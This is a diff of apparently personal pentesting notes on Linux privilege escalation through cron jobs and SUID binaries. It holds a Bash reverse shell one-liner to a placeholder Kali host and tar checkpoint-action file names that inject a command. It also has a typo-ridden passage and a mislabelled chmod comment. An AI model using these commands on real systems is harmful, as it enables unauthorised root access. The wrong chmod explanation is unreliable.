@@ -118,9 +118,9 @@ cat /etc/cron.deny*
 
 This thechnique involves identifying the default `$PATH` variable that's been configured for cron jobs in the `crontab` file, generating a payload, and placing it in the path.
 
-<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
-
 <figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 So we create the `overwrive.sh` script in the /home/user folder and insert a Bash reverse shell.
 
@@ -132,7 +132,7 @@ echo "bash -i >& /dev/tcp/<KALI-IP>/<PORT> 0>&1" > overwrite.sh
 
 Using the example above: `cat /usr/local/bin/compress.sh`&#x20;
 
-<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 tar utility has a checkpoint feature that is used to display progress messages after a specific set of files. It also allows users to define a specific action that is executed during the checkpoint. We can leverage this feature to execute a reverse shell payload that will provide us with an elevated session when executed.
 
@@ -142,3 +142,32 @@ touch /home/user/--checkpoint=1 #Set up tar checkpoint
 touch /home/user/--checkpoint-action=exec=sh\ shell.sh #Set the checkpoint action
 
 ```
+
+#### Escalation via file overwrites
+
+The success and viability of this technique will depend on whether we have the necessary permissions to write or make changes to the script or file being run by the cron job.
+
+Using the first example, if script is not found in the first directory, cron will check the other directories specified in the $PATH variable
+
+we can search for the script in the other directories specified in the $PATH variable. This can be done by listing the contents of each directory, as follows: `ls -al /usr/local/bin | grep overwrite.sh` or `locate overwrite.sh` . After, we identify the permissions and create a overwrite.sh with a reverse shell.
+
+## Exploiting SUID Binaries
+
+<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+#### Changing permissions
+
+<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Examples:&#x20;
+
+```bash
+chmod +x script.sh #Executable permissions
+chmod u+x script.sh #Executable permissins to all users
+chmod g+x, a+w script.sh #Groups executable permissions and all users and groups write permissions
+chmod a-x script.sh #Remove executable permissions from a file
+```
+
+#### Understanding SUID permissions
